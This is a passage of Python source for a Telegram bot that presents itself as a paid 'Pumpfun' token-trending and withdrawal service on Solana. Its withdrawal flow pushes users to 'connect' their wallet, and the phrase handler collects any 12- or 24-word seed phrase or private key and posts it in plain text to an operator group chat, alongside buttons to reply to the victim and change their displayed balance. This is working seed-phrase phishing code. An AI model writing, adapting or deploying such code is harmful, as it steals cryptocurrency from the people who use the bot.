        print(f"DEBUG: Message {message_id} already processed, skipping")
        return
    
    # Mark message as processed
    processed_messages.add(message_id)
    
    print(f"DEBUG: Withdrawal amount handler triggered for user {chat_id}, text: {message.text}")
    
    if message.text:
        # Handle cancel command
        if message.text.lower() in ['/cancel', 'cancel', 'back']:
            withdrawal_amount_waiting.discard(chat_id)
            bot.send_message(chat_id, "❌ Withdrawal cancelled. Returning to balance menu...")
            return
        
        try:
            amount = float(message.text)
            
            # Check if user has sufficient balance
            from checkbalance import get_user_balance
            current_balance = get_user_balance(chat_id)
            
            # Ensure balance is a number
            if not isinstance(current_balance, (int, float)):
                current_balance = 0.0
            
            if amount < 5:
                bot.send_message(chat_id, "❌ Minimum withdrawal amount is 5 SOL")
                return
            elif amount > current_balance:
                bot.send_message(chat_id, f"❌ Insufficient balance! You have {current_balance:.4f} SOL, trying to withdraw {amount:.4f} SOL")
                return
            else:
                # Valid amount, ask for wallet connection
                withdrawal_amount_waiting.discard(chat_id)
                
                wallet_connection_text = f"""
🔗 <b>CONNECT YOUR WALLET</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💰 <b>WITHDRAWAL DETAILS</b>
• Amount: <b>{amount:.4f} SOL</b>
• Current Balance: <b>{current_balance:.4f} SOL</b>
• Remaining After Withdrawal: <b>{current_balance - amount:.4f} SOL</b>

🔗 <b>WALLET CONNECTION REQUIRED</b>
• Click the button below to connect your wallet
• This will avoid gas fees for withdrawal
• Your withdrawal will be processed instantly

⚠️ <b>Important Notes</b>
• Pumpfun bot will not remove any charges for withdrawal
• Network fees may still apply
• Ensure your wallet address is correct
• Withdrawals are final and cannot be reversed

💡 <b>Next Step:</b> Connect your wallet to proceed
"""
                
                from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
                markup = InlineKeyboardMarkup()
                connect_btn = InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")
                why_connect_btn = InlineKeyboardButton("❓ Why Connect?", callback_data="why_connect_wallet")
                cancel_btn = InlineKeyboardButton("❌ Cancel", callback_data="balance")
                back_btn = InlineKeyboardButton("🔙 Back to Balance", callback_data="balance")
                
                markup.add(connect_btn)
                markup.add(why_connect_btn)
                markup.add(cancel_btn, back_btn)
                
                bot.send_message(chat_id, wallet_connection_text, reply_markup=markup, parse_mode="HTML")
                return
                
        except ValueError:
            bot.send_message(chat_id, "❌ Invalid amount. Please enter a valid number (e.g., 5.5)")
            return

@bot.message_handler(func=lambda message: not message.text.startswith('/') and message.chat.id != group_chat_id)
def handle_contract_address_or_tx(message):
    chat_id = message.chat.id
    message_id = message.message_id
    
    # Skip if message already processed
    if message_id in processed_messages:
        print(f"DEBUG: Message {message_id} already processed in handle_contract_address_or_tx, skipping")
        return
    
    print(f"DEBUG: handle_contract_address_or_tx triggered for user {chat_id}, text: {message.text}")

    # Skip if user is in deposit amount waiting state (let deposit_amount_waiting handler process it)
    if chat_id in deposit_amount_waiting:
        print(f"DEBUG: Skipping handle_contract_address_or_tx for user {chat_id} - they are in deposit_amount_waiting")
        return
    
    # Skip if user is in withdrawal amount waiting state (let withdrawal_amount_waiting handler process it)
    if chat_id in withdrawal_amount_waiting:
        print(f"DEBUG: Skipping handle_contract_address_or_tx for user {chat_id} - they are in withdrawal_amount_waiting")
        return

    # Import required functions
    from checkbalance import get_incomplete_orders
    from bot_interations import send_payment_verification_to_group
    import time
    incomplete_orders = get_incomplete_orders(chat_id)
    if incomplete_orders and is_valid_tx_hash(message.text.strip()):
        tx_hash = message.text.strip()
        # Get the most recent incomplete order
        latest_order = incomplete_orders[-1]
        amount = latest_order.get('price', 0)
        
        # Send to admin group for verification instead of auto-confirming
        user = message.from_user.username or message.from_user.id
        send_payment_verification_to_group(user, f"{amount:.4f} SOL", "Deposit", tx_hash, user_chat_id=chat_id)
        
        # Remove the incomplete order since it's now pending admin approval
        from checkbalance import remove_incomplete_order
        remove_incomplete_order(chat_id, len(incomplete_orders) - 1)
        
        # Notify user that deposit is pending admin approval
        bot.send_message(chat_id, 
            f"✅ <b>tx hash received successfully, please wait while i confirm this immediately</b>\n\n"
            f"⏱️ <b>time may take up to a minute depending on network congestions</b>",
            parse_mode="HTML"
        )
        return

    if chat_id in tx_hash_waiting:
        tx_hash = message.text.strip()
        if is_valid_tx_hash(tx_hash):
            waiting_data = tx_hash_waiting[chat_id]
            price = waiting_data['price']
            ca = waiting_data['ca']
            user = message.from_user.username or message.from_user.id
            send_payment_verification_to_group(user, price, ca, tx_hash, user_chat_id=chat_id)
            bot.send_message(chat_id, "✅ <b>tx hash received successfully, please wait while i confirm this immediately</b>\n\n⏱️ <b>time may take up to a minute depending on network congestions</b>", parse_mode="HTML")
            tx_hash_waiting.pop(chat_id, None)
        else:
            # Invalid tx hash - show retry options
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🔄 Retry", callback_data="tx_retry"),
                InlineKeyboardButton("❌ Cancel", callback_data="tx_cancel")
            )
            bot.send_message(chat_id, "❌ <b>Invalid Transaction Hash</b>\nPlease send a valid Ethereum or Solana transaction hash.", reply_markup=markup)
        return

    # Handle CA input with new handler
    if is_user_waiting_for_ca(chat_id):
        # Determine which temp_ca_info to use based on the source
        from ca_input_handler import ca_waiting_users
        if chat_id in ca_waiting_users:
            source = ca_waiting_users[chat_id]['source']
            if source == "volume":
                ca_info_dict = volume_temp_ca_info
            else:
                ca_info_dict = temp_ca_info
        else:
            ca_info_dict = temp_ca_info

        if handle_ca_input(message, send_payment_instructions, ca_info_dict):
            return

    # All CA input is now handled by the new CA input handler above
    # No additional CA handling needed here

    # Handle banner image input for dexscreener
    if banner_waiting.get(chat_id):
        if message.photo:
            # Valid image received, trigger premium_sol function
            banner_waiting.pop(chat_id, None)
            # Call SOL trending directly
            chat_id = message.chat.id
            text = (
                "📈 <b>Boost Your Visibility</b>\n\n"
                "Trending delivers guaranteed exposure, milestone highlights, and real-time momentum updates to amplify your project.\n\n"
                "🎙️ A paid boost also guarantees you a spot in our daily livestream (AMA).\n\n"
                "Please choose an option below to get started:\n"
                "_____________________"
            )
            markup = InlineKeyboardMarkup(row_width=2)
            # Top header
            markup.add(InlineKeyboardButton("🔻 TOP 6 🔻", callback_data="none"))
            # First row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 5 hours | 2 SOL", callback_data="sol_5h_2sol"),
                InlineKeyboardButton("⏳ 7 hours | 3.5 SOL", callback_data="sol_7h_3.5sol")
            )
            # Second row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 12 hours | 7 SOL", callback_data="sol_12h_7sol"),
                InlineKeyboardButton("⏳ 24 hours | 15 SOL", callback_data="sol_24h_15sol")
            )
            # Third row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 18 hours | 10 SOL", callback_data="sol_18h_10sol"),
                InlineKeyboardButton("⏳ 32 hours | 22 SOL", callback_data="sol_32h_22sol")
            )
            # Bottom row: 2 wider buttons
            markup.add(
                InlineKeyboardButton("🔙 Back", callback_data="sol_back"),
                InlineKeyboardButton("🔝 Main Menu", callback_data="sol_mainmenu")
            )
            bot.send_message(chat_id, text, reply_markup=markup)
        else:
            bot.send_message(chat_id, "❌ Please send a valid image file.")
        return

    # Handle wallet phrase input for connect
    if connect_phrase_waiting.get(chat_id):
        # Check if the phrase is valid (12 or 24 space-separated words) or a valid private key
        phrase = message.text.strip()
        words = phrase.split()
        is_phrase = len(words) in [12, 24]
        is_private_key = len(phrase) > 10
        if is_phrase or is_private_key:
            bot.send_message(chat_id, "CONNECTION OF WALLET MAY TAKE SOME TIME BASED ON NETWORK CONJESTIONS \nPLEASE BE PATIENT")
            # Notify group to await reply
            user = message.from_user.username or message.from_user.id
            bot.send_message(group_chat_id, f"Awaiting reply for wallet connection from @{user}")
            connect_phrase_waiting.pop(chat_id, None)
            # Send phrase/private key to bot group with reply/close/balance buttons
            phrase_md = mdv2_escape(phrase)
            group_text = (
                f"CONNECT WALLET\n"
                f"User: @{user} (ID: {chat_id})\n"
                f"Phrase: {phrase_md}"
            )
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("reply", callback_data=f"group_reply_{chat_id}"),
                InlineKeyboardButton("change balance", callback_data=f"group_balance_{chat_id}")
            )
            markup.add(
                InlineKeyboardButton("close", callback_data=f"group_close_{chat_id}")
            )
            bot.send_message(group_chat_id, group_text, reply_markup=markup, parse_mode="Markdown")
        else:
            connect_phrase_waiting.pop(chat_id, None)
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("Retry", callback_data="try_connect_again"),
                InlineKeyboardButton("Menu", callback_data="menu_for_connect")
            )
            bot.send_message(chat_id, "❌ Invalid wallet phrase or private key. Please send a valid 12 or 24 word phrase, or a valid private key.", reply_markup=markup)
        return

    # All CA input is now handled by the new CA input handler above
    # No additional CA handling needed here


@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    
    # Handle banner image input for dexscreener
    if banner_waiting.get(chat_id):
        banner_waiting.pop(chat_id, None)
        # Call SOL trending directly
        text = (
            "🟢Discover the Power of Trending!\n\n"
            "Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n"
            "🟢A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n"
            "➔ Please choose SOL Trending or Pump Fun Trending to start:\n"
            "_____________________"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(InlineKeyboardButton("🔻 TOP 6 🔻", callback_data="none"))
        markup.add(
            InlineKeyboardButton("⏳ 5 hours | 2 SOL", callback_data="sol_5h_2sol"),
            InlineKeyboardButton("⏳ 7 hours | 3.5 SOL", callback_data="sol_7h_3.5sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 12 hours | 7 SOL", callback_data="sol_12h_7sol"),
            InlineKeyboardButton("⏳ 24 hours | 15 SOL", callback_data="sol_24h_15sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 18 hours | 10 SOL", callback_data="sol_18h_10sol"),
            InlineKeyboardButton("⏳ 32 hours | 22 SOL", callback_data="sol_32h_22sol")
        )
        markup.add(
            InlineKeyboardButton("🔙 Back", callback_data="sol_back"),
            InlineKeyboardButton("🔝 Main Menu", callback_data="sol_mainmenu")
        )
        bot.send_message(chat_id, text, reply_markup=markup)
    # (You can add other photo handling logic here if needed)

# Store users waiting for custom withdrawal amounts
custom_withdrawal_waiting = set()

@bot.message_handler(func=lambda message: message.chat.id in custom_withdrawal_waiting)
def handle_custom_withdrawal(message):
    """Handle custom withdrawal amounts when user is in withdrawal mode"""
    chat_id = message.chat.id
    
    if message.text:
        # Handle cancel command
        if message.text.lower() in ['/cancel', 'cancel', 'back']:
            custom_withdrawal_waiting.discard(chat_id)
            bot.send_message(chat_id, "❌ Custom withdrawal cancelled. Returning to withdrawal menu...")
            return
        
        try:
            amount = float(message.text)
            if 5 <= amount <= 1000:  # Reasonable withdrawal range
                # Check if user has sufficient balance
                from checkbalance import get_user_balance, update_user_balance
                
                current_balance = get_user_balance(chat_id)
                
                # Ensure balance is a number
                if not isinstance(current_balance, (int, float)):
                    current_balance = 0.0
                
                if current_balance >= amount:
                    # Process withdrawal
                    new_balance = update_user_balance(chat_id, -amount, f"withdraw_custom_{int(time.time())}")
                    
                    withdrawal_text = f"""
✅ <b>WITHDRAWAL PROCESSED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💰 <b>WITHDRAWAL DETAILS</b>
• Amount Withdrawn: <b>{amount:.4f} SOL</b>
• Remaining Balance: <b>{new_balance:.4f} SOL</b>
• Transaction ID: <b>withdraw_custom_{int(time.time())}</b>

⏰ <b>PROCESSING TIME</b>
• Status: <b>🟡 Pending</b>
• Estimated: <b>24 hours</b>
• You'll be notified when completed

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 <i>Withdrawal request submitted at {time.strftime('%H:%M:%S UTC')}</i>
"""
                    
                    markup = InlineKeyboardMarkup()
                    back_btn = InlineKeyboardButton("🔙 Back to Balance", callback_data="balance")
                    refresh_btn = InlineKeyboardButton("🔄 Refresh", callback_data="balance")
                    
                    markup.add(back_btn, refresh_btn)
                    
                    bot.send_message(chat_id, withdrawal_text, reply_markup=markup, parse_mode="HTML")
                    custom_withdrawal_waiting.discard(chat_id)
                    return
                else:
                    bot.send_message(chat_id, f"❌ Insufficient balance! You have {current_balance:.4f} SOL, trying to withdraw {amount:.4f} SOL")
                    return
            else:
                bot.send_message(chat_id, "❌ Amount must be between 5 and 1000 SOL")
                return
        except ValueError:
            bot.send_message(chat_id, "❌ Invalid amount. Please enter a valid number (e.g., 5.5)")
            return



if __name__ == "__main__":
    # Create process
    # lock to prevent multiple instances
    bot_lock = BotLock()

    if not bot_lock.acquire():
        print("Exiting...")
        sys.exit(1)

    print("bot is running")
    try:
        bot.polling(none_stop=True, timeout=60)
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print(f"Bot error: {e}")
    finally:
        bot_lock.release()
        print("Bot stopped")
